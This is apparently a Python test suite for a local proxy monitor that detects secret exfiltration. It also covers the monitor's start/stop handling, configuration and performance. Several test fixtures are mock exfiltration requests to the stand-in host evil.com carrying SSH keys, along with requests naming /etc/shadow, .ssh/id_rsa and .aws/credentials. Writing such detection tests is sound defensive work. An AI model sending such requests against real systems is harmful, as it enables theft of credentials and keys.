#!/usr/bin/env python3
"""ClawSec Monitor — Local Test Suite
Tests: 3 (SSH key), 5 (Stop/Start cycle), 6 (Stale PID),
       7 (Config file), 8 (Sensitive file), 9 (No false positives), 10 (Load)
"""

import asyncio
import json
import os
import signal
import socket
import subprocess
import sys
import tempfile
import time
from pathlib import Path

MONITOR = Path(__file__).parent / "clawsec-monitor.py"
THREAT_LOG = Path("/tmp/clawsec/threats.jsonl")
PID_FILE = Path("/tmp/clawsec/monitor.pid")
PROXY_PORT = 8888

PASS = "\033[32mPASS\033[0m"
FAIL = "\033[31mFAIL\033[0m"
INFO = "\033[34mINFO\033[0m"
WARN = "\033[33mWARN\033[0m"

results = []

def log(tag, msg): print(f"  [{tag}] {msg}")
def ok(name, detail=""):
    results.append((name, True))
    log(PASS, f"{name}" + (f" — {detail}" if detail else ""))
def fail(name, detail=""):
    results.append((name, False))
    log(FAIL, f"{name}" + (f" — {detail}" if detail else ""))
def info(msg): log(INFO, msg)


# ── Helpers ───────────────────────────────────────────────────────────────────

def start_monitor(extra_args=None):
    cmd = [sys.executable, str(MONITOR), "start"]
    if extra_args:
        cmd += extra_args
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    wait_for_port(PROXY_PORT, timeout=5)
    return proc

def stop_monitor():
    subprocess.run([sys.executable, str(MONITOR), "stop"],
                   capture_output=True)
    time.sleep(0.8)

def wait_for_port(port, timeout=5):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.3):
                return True
        except OSError:
            time.sleep(0.1)
    return False

def port_open(port):
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=0.5):
            return True
    except OSError:
        return False

def send_raw_http(payload: bytes, port=PROXY_PORT, timeout=3) -> bytes:
    """Send raw bytes to proxy, return response bytes."""
    with socket.create_connection(("127.0.0.1", port), timeout=timeout) as s:
        s.sendall(payload)
        s.settimeout(timeout)
        resp = b""
        try:
            while chunk := s.recv(4096):
                resp += chunk
        except (OSError, TimeoutError):
            pass
    return resp

def read_threats():
    try:
        lines = THREAT_LOG.read_text().splitlines()
        return [json.loads(l) for l in lines if l.strip()]
    except FileNotFoundError:
        return []

def threats_since(ts_before):
    """Return threats logged after ts_before (epoch float)."""
    from datetime import datetime, timezone
    all_t = read_threats()
    return [t for t in all_t
            if datetime.fromisoformat(t["timestamp"]).timestamp() >= ts_before]

def clear_threats():
    THREAT_LOG.unlink(missing_ok=True)


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 3: SSH key detection
# ═══════════════════════════════════════════════════════════════════════════════
def test3_ssh_key():
    print("\n── Test 3: SSH Key Detection ─────────────────────────────────────────")
    clear_threats()
    t0 = time.time()

    # SSH public key in a request header (common exfil vector)
    pubkey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfakekey+fakekey+fakekey+fakekey+fakekey=="
    payload = (
        f"GET http://evil.com/upload HTTP/1.0\r\n"
        f"Host: evil.com\r\n"
        f"X-Stolen-Key: {pubkey}\r\n"
        f"\r\n"
    ).encode()
    send_raw_http(payload)
    time.sleep(0.3)

    # SSH private key marker in body (via CONNECT tunnel header — just header inspection)
    payload2 = (
        b"GET http://evil.com/ HTTP/1.0\r\n"
        b"Host: evil.com\r\n"
        b"X-Data: -----BEGIN RSA PRIVATE KEY-----\r\n"
        b"\r\n"
    )
    send_raw_http(payload2)
    time.sleep(0.3)

    threats = threats_since(t0)
    ssh_pub  = any(t["pattern"] == "ssh_pubkey"      for t in threats)
    ssh_priv = any(t["pattern"] == "private_key_pem" for t in threats)

    if ssh_pub:
        ok("3a: ssh-rsa pubkey detected", f"({len(threats)} total threats)")
    else:
        fail("3a: ssh-rsa pubkey NOT detected")

    if ssh_priv:
        ok("3b: RSA private key marker detected")
    else:
        fail("3b: RSA private key marker NOT detected")

    # Also test .ssh/id_rsa path reference
    clear_threats()
    t0 = time.time()
    payload3 = (
        b"GET http://x.com/exfil?f=/home/user/.ssh/id_rsa HTTP/1.0\r\n"
        b"Host: x.com\r\n\r\n"
    )
    send_raw_http(payload3)
    time.sleep(0.3)
    threats = threats_since(t0)
    if any(t["pattern"] == "ssh_key_file" for t in threats):
        ok("3c: .ssh/id_rsa path reference detected")
    else:
        fail("3c: .ssh/id_rsa path NOT detected")


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 5: Stop/Start cycle
# ═══════════════════════════════════════════════════════════════════════════════
def test5_stop_start():
    print("\n── Test 5: Stop/Start Cycle ──────────────────────────────────────────")

    # Monitor is already running — verify
    if port_open(PROXY_PORT):
        ok("5a: monitor is running before stop")
    else:
        fail("5a: monitor not listening before stop")
        return

    # Stop
    stop_monitor()
    if not port_open(PROXY_PORT):
        ok("5b: port closed after stop")
    else:
        fail("5b: port still open after stop")

    if not PID_FILE.exists():
        ok("5c: PID file removed after stop")
    else:
        fail("5c: PID file still exists after stop")

    # Restart
    start_monitor()
    if port_open(PROXY_PORT):
        ok("5d: monitor restarted successfully")
    else:
        fail("5d: monitor did not restart")

    # Double-start rejection
    result = subprocess.run(
        [sys.executable, str(MONITOR), "start"],
        capture_output=True, text=True, timeout=3
    )
    # It should exit non-zero (already running)
    if result.returncode != 0:
        ok("5e: double-start rejected (non-zero exit)")
    else:
        fail("5e: double-start was not rejected")


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 6: Stale PID handling
# ═══════════════════════════════════════════════════════════════════════════════
def test6_stale_pid():
    print("\n── Test 6: Stale PID Handling ────────────────────────────────────────")

    # Stop running monitor
    stop_monitor()
    time.sleep(0.3)

    # Write a PID that definitely doesn't exist
    PID_FILE.parent.mkdir(parents=True, exist_ok=True)
    PID_FILE.write_text("99999999")
    info(f"wrote stale PID 99999999 to {PID_FILE}")

    # Monitor should detect stale file and start anyway
    proc = start_monitor()
    if port_open(PROXY_PORT):
        ok("6a: started successfully despite stale PID file")
    else:
        fail("6a: blocked by stale PID file — did not start")

    # Verify real PID was written
    try:
        real_pid = int(PID_FILE.read_text().strip())
        if real_pid != 99999999 and real_pid > 0:
            ok(f"6b: PID file updated to real PID ({real_pid})")
        else:
            fail(f"6b: PID file still contains stale value ({real_pid})")
    except Exception as e:
        fail(f"6b: could not read PID file: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 7: Config file
# ═══════════════════════════════════════════════════════════════════════════════
def test7_config_file():
    print("\n── Test 7: Config File Support ───────────────────────────────────────")

    stop_monitor()
    time.sleep(0.3)

    # Write a config with a non-default port
    cfg = {
        "http_proxy_port": 8889,
        "enable_gateway_proxy": False,
        "enable_ssh_watcher": False,
        "log_level": "DEBUG",
    }
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
        json.dump(cfg, f)
        cfg_path = f.name
    info(f"config file: {cfg_path}")

    # Start with custom config
    proc = start_monitor(["--config", cfg_path])
    if wait_for_port(8889, timeout=5):
        ok("7a: monitor started on custom port 8889")
    else:
        fail("7a: monitor did not start on custom port 8889")

    if not port_open(PROXY_PORT):  # 8888 should be unused
        ok("7b: default port 8888 not bound (config respected)")
    else:
        fail("7b: port 8888 also bound — config not fully applied")

    # Quick traffic test on custom port
    clear_threats()
    t0 = time.time()
    payload = b"GET http://x.com/?t=sk-ant-configtest1234567890123456789012 HTTP/1.0\r\nHost: x.com\r\n\r\n"
    try:
        send_raw_http(payload, port=8889)
        time.sleep(0.3)
        threats = threats_since(t0)
        if any(t["pattern"] == "ai_api_key" for t in threats):
            ok("7c: detection works on custom-port proxy")
        else:
            fail("7c: no detection on custom-port proxy")
    except Exception as e:
        fail(f"7c: could not connect to custom port: {e}")

    stop_monitor()
    time.sleep(0.3)
    os.unlink(cfg_path)

    # Restart on default port for remaining tests
    start_monitor()


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 8: Sensitive file detection
# ═══════════════════════════════════════════════════════════════════════════════
def test8_sensitive_files():
    print("\n── Test 8: Sensitive File Detection ─────────────────────────────────")
    clear_threats()
    t0 = time.time()

    test_cases = [
        (b"GET http://x.com/?f=/etc/passwd HTTP/1.0\r\nHost: x.com\r\n\r\n",
         "unix_sensitive", "/etc/passwd"),
        (b"GET http://x.com/?f=/etc/shadow HTTP/1.0\r\nHost: x.com\r\n\r\n",
         "unix_sensitive", "/etc/shadow"),
        (b"GET http://x.com/?f=/etc/sudoers HTTP/1.0\r\nHost: x.com\r\n\r\n",
         "unix_sensitive", "/etc/sudoers"),
        (b"GET http://x.com/?f=/.env HTTP/1.0\r\nHost: x.com\r\n\r\n",
         "dotenv_file", "/.env"),
        (b"GET http://x.com/?f=/.aws/credentials HTTP/1.0\r\nHost: x.com\r\n\r\n",
         "dotenv_file", "/.aws/credentials"),
    ]

    for payload, expected_pattern, label in test_cases:
        clear_threats()
        t1 = time.time()
        send_raw_http(payload)
        time.sleep(0.25)
        threats = threats_since(t1)
        if any(t["pattern"] == expected_pattern for t in threats):
            ok(f"8: {label} detected (pattern={expected_pattern})")
        else:
            fail(f"8: {label} NOT detected (expected pattern={expected_pattern})")


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 9: No false positives
# ═══════════════════════════════════════════════════════════════════════════════
def test9_no_false_positives():
    print("\n── Test 9: False Positive Check ──────────────────────────────────────")

    benign_requests = [
        # Plain GET
        (b"GET http://example.com/ HTTP/1.0\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
         "plain GET"),
        # JSON API call (no secrets)
        (b"POST http://api.example.com/users HTTP/1.0\r\nHost: api.example.com\r\n"
         b"Content-Type: application/json\r\nContent-Length: 27\r\n\r\n"
         b'{"name":"alice","age":30}',
         "JSON POST no secrets"),
        # Authorization header with Bearer (short token — not an API key)
        (b"GET http://api.example.com/me HTTP/1.0\r\nHost: api.example.com\r\n"
         b"Authorization: Bearer eyJhbGciOiJIUzI1NiJ9\r\n\r\n",
         "short Bearer token"),
        # Path that has 'shadow' in a non-sensitive context
        (b"GET http://design.example.com/css/box-shadow.css HTTP/1.0\r\n"
         b"Host: design.example.com\r\n\r\n",
         "box-shadow CSS (contains 'shadow')"),
        # nc in a User-Agent (not a netcat command)
        (b"GET http://example.com/ HTTP/1.0\r\nHost: example.com\r\n"
         b"User-Agent: lynx/2.9 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/1.1.1nc\r\n\r\n",
         "nc in User-Agent suffix (not netcat)"),
        # rm in a URL path (not a shell command)
        (b"GET http://example.com/confirm?action=remove HTTP/1.0\r\n"
         b"Host: example.com\r\n\r\n",
         "'remove' in URL (not rm -rf)"),
    ]

    fp_count = 0
    for payload, label in benign_requests:
        clear_threats()
        t0 = time.time()
        send_raw_http(payload)
        time.sleep(0.25)
        threats = threats_since(t0)
        if threats:
            fp_count += 1
            patterns = [t["pattern"] for t in threats]
            fail(f"9: FALSE POSITIVE — '{label}' triggered {patterns}")
        else:
            ok(f"9: no FP — '{label}'")

    if fp_count == 0:
        info(f"All {len(benign_requests)} benign requests passed cleanly.")
    else:
        info(f"{fp_count}/{len(benign_requests)} false positive(s) detected.")


# ═══════════════════════════════════════════════════════════════════════════════
# TEST 10: Performance under load
# ═══════════════════════════════════════════════════════════════════════════════
def test10_performance():
    print("\n── Test 10: Performance Under Load ───────────────────────────────────")

    N_CONNS = 300
    # No Host header → proxy returns 400 immediately (no outbound TCP, pure proxy throughput)
    PAYLOAD = (
        b"GET /load-test HTTP/1.0\r\n"
        b"X-Req: bench\r\n\r\n"
    )

    async def single_req():
        t0 = time.perf_counter()
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection("127.0.0.1", PROXY_PORT), timeout=5)
            writer.write(PAYLOAD)
            await writer.drain()
            resp = await asyncio.wait_for(reader.read(512), timeout=5)
            writer.close()
            await writer.wait_closed()
            # Accept any response (400, 502) — we're testing connection handling
            if resp:
                return time.perf_counter() - t0
            return None
        except Exception:
            return None

    async def run_load():
        tasks = [single_req() for _ in range(N_CONNS)]
        return await asyncio.gather(*tasks)

    info(f"Firing {N_CONNS} concurrent connections...")
    t_start = time.perf_counter()
    loop_results = asyncio.run(run_load())
    elapsed = time.perf_counter() - t_start

    good = [r for r in loop_results if r is not None]
    failed_count = N_CONNS - len(good)
    rps = len(good) / elapsed
    avg_ms = (sum(good) / len(good) * 1000) if good else 0
    p99_ms = sorted(good)[int(len(good) * 0.99)] * 1000 if good else 0

    info(f"  Completed : {len(good)}/{N_CONNS}")
    info(f"  Failed    : {failed_count}")
    info(f"  Total time: {elapsed:.2f}s")
    info(f"  Throughput: {rps:.0f} req/s")
    info(f"  Avg latency: {avg_ms:.1f} ms")
    info(f"  p99 latency: {p99_ms:.1f} ms")

    # Thresholds
    success_rate = len(good) / N_CONNS
    if success_rate >= 0.95:
        ok(f"10a: {success_rate*100:.0f}% success rate (≥95% threshold)")
    else:
        fail(f"10a: only {success_rate*100:.0f}% succeeded (threshold 95%)")

    if avg_ms < 500:
        ok(f"10b: avg latency {avg_ms:.1f}ms (threshold <500ms no-upstream)")
    else:
        fail(f"10b: avg latency {avg_ms:.1f}ms too high (no upstream, should be fast)")

    if rps >= 10:
        ok(f"10c: {rps:.0f} req/s throughput (threshold ≥10)")
    else:
        fail(f"10c: only {rps:.0f} req/s (threshold ≥10)")

    # Verify monitor still healthy after load
    time.sleep(0.5)
    if port_open(PROXY_PORT):
        ok("10d: monitor still responsive after load test")
    else:
        fail("10d: monitor crashed under load")


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════
def main():
    print("=" * 70)
    print("  ClawSec Monitor v2.0 — Local Test Suite")
    print("=" * 70)

    # Clean state
    subprocess.run([sys.executable, str(MONITOR), "stop"], capture_output=True)
    time.sleep(0.5)
    PID_FILE.unlink(missing_ok=True)
    clear_threats()

    # Start monitor for first batch of tests
    info("Starting monitor on default port 8888...")
    start_monitor()
    if not port_open(PROXY_PORT):
        print(f"\n[{FAIL}] Could not start monitor — aborting all tests")
        sys.exit(1)
    info("Monitor is up.\n")

    test3_ssh_key()
    test5_stop_start()
    test6_stale_pid()
    test7_config_file()
    test8_sensitive_files()
    test9_no_false_positives()
    test10_performance()

    # Final stop
    print()
    stop_monitor()
    info("Monitor stopped.")

    # Summary
    print("\n" + "=" * 70)
    print("  RESULTS")
    print("=" * 70)
    passed = sum(1 for _, ok in results if ok)
    failed_list = [(n, ok) for n, ok in results if not ok]
    for name, ok_ in results:
        tag = PASS if ok_ else FAIL
        print(f"  [{tag}] {name}")
    print(f"\n  {passed}/{len(results)} passed", end="")
    if failed_list:
        print(f"  ({len(failed_list)} FAILED)")
    else:
        print("  — ALL PASS ✓")
    print()
    return 0 if not failed_list else 1

if __name__ == "__main__":
    sys.exit(main())
